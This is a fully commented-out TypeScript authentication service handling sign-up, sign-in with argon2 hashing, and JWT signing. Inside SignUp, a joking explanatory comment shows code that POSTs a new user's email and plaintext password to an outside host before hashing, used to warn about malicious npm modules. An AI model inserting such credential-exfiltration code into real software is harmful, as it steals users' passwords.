// import { Container, Service, Inject } from 'typedi';
// import jwt from 'jsonwebtoken';
// //import MailerService from './mailer.ts.bak';
// import config from '../config';
// import argon2 from 'argon2';
// import { randomBytes } from 'crypto';
// import { IUserDTO } from '../dto/IUserDTO';
// import { User } from '../domain/user';
// import RoleRepo from '../repos/roleRepo';
// import { Role } from '../domain/role';
// import { RoleId } from '../domain/roleId';
// import  UserRepo  from '../repos/userRepo';
// import { Result } from "../core/logic/Result";
// import { UserMap } from "../mappers/UserMap";

// import { UserPassword } from '../domain/userPassword';
// import { UserEmail } from '../domain/userEmail';

// @Service()
// export default class AuthService {
//   constructor(
//       @Inject('userModel') private userModel : Models.UserModel,
//       @Inject('logger') private logger,
//   ) {}


//   private async getRole (roleId: string): Promise<Result<Role>> {
//     var roleRepo = Container.get( RoleRepo );

//     const role = await roleRepo.findByDomainId( roleId );
//     const found = !!role;

//     if (found) {
//       return Result.ok<Role>(role)
//     } else {
//       return Result.fail<Role>("Couldn't find role by id=" + role.id.toString());
//     }
//   }

//   public async SignUp(userDTO: IUserDTO): Promise<Result<{ userDTO: IUserDTO; token: string }>> {
//     try {
//       var userRepo = Container.get( UserRepo );

//       const userDocument = await userRepo.findByEmail( userDTO.email );
//       const found = !!userDocument;
  
//       if (found) {
//         return Result.fail<{userDTO: IUserDTO, token: string}>("User already exists with email=" + userDTO.email);
//       }

//       /**
//        * Here you can call to your third-party malicious server and steal the user password before it's saved as a hash.
//        * require('http')
//        *  .request({
//        *     hostname: 'http://my-other-api.com/',
//        *     path: '/store-credentials',
//        *     port: 80,
//        *     method: 'POST',
//        * }, ()=>{}).write(JSON.stringify({ email, password })).end();
//        *
//        * Just kidding, don't do that!!!
//        *
//        * But what if, an NPM module that you trust, like body-parser, was injected with malicious code that
//        * watches every API call and if it spots a 'password' and 'email' property then
//        * it decides to steal them!? Would you even notice that? I wouldn't :/
//        */
      

//       const salt = randomBytes(32);
//       this.logger.silly('Hashing password');
//       const hashedPassword = await argon2.hash(userDTO.password, { salt });
//       this.logger.silly('Creating user db record');

//       const password = await UserPassword.create({ value: hashedPassword, hashed: true}).getValue();
//       const email = await UserEmail.create( userDTO.email ).getValue();
//       let role: Role;

//       const roleOrError = await this.getRole(userDTO.role);
//       if (roleOrError.isFailure) {
//         return Result.fail<{userDTO: IUserDTO; token: string}>(roleOrError.error);
//       } else {
//         role = roleOrError.getValue();
//       }

//       const userOrError = await User.create({
//         firstName: userDTO.firstName,
//         lastName: userDTO.lastName,
//         email: email,
//         role: role,
//         password: password,
//       });

//       if (userOrError.isFailure) {
//         throw Result.fail<IUserDTO>(userOrError.errorValue());
//       }

//       const userResult = userOrError.getValue();

//       this.logger.silly('Generating JWT');
//       const token = this.generateToken(userResult);

//       this.logger.silly('Sending welcome email');
//       //await this.mailer.SendWelcomeEmail(userResult);

//       //this.eventDispatcher.dispatch(events.user.signUp, { user: userResult });

//       var userRepo = Container.get(UserRepo);
//       await userRepo.save(userResult);
//       const userDTOResult = UserMap.toDTO( userResult ) as IUserDTO;
//       return Result.ok<{userDTO: IUserDTO; token: string}>( {userDTO: userDTOResult, token: token} )

//     } catch (e) {
//       this.logger.error(e);
//       throw e;
//     }
//   }

//   public async SignIn(email: string, password: string): Promise<{ user: IUserDTO; token: string }> {
//     const userRecord = await this.userModel.findOne({ email });
//     if (!userRecord) {
//       throw new Error('User not registered');
//     }
//     /**
//      * We use verify from argon2 to prevent 'timing based' attacks
//      */
//     this.logger.silly('Checking password');
//     const validPassword = await argon2.verify(userRecord.password, password);
//     if (validPassword) {
//       this.logger.silly('Password is valid!');
//       this.logger.silly('Generating JWT');
//       const token = this.generateToken(userRecord);

//       const user = userRecord.toObject();
//       Reflect.deleteProperty(user, 'password');
//       Reflect.deleteProperty(user, 'salt');
//       /**
//        * Easy as pie, you don't need passport.js anymore :)
//        */
//       return { user, token };
//     } else {
//       throw new Error('Invalid Password');
//     }
//   }

//   private generateToken(user) {
//     const today = new Date();
//     const exp = new Date(today);
//     exp.setDate(today.getDate() + 60);

//     /**
//      * A JWT means JSON Web Token, so basically it's a json that is _hashed_ into a string
//      * The cool thing is that you can add custom properties a.k.a metadata
//      * Here we are adding the userId, role and name
//      * Beware that the metadata is public and can be decoded without _the secret_
//      * but the client cannot craft a JWT to fake a userId
//      * because it doesn't have _the secret_ to sign it
//      * more information here: https://softwareontheroad.com/you-dont-need-passport
//      */
//     this.logger.silly(`Sign JWT for userId: ${user._id}`);
//     return jwt.sign(
//       {
//         _id: user._id, // We are gonna use this in the middleware 'isAuth'
//         role: user.role,
//         name: user.name,
//         exp: exp.getTime() / 1000,
//       },
//       config.jwtSecret,
//     );
//   }

// }
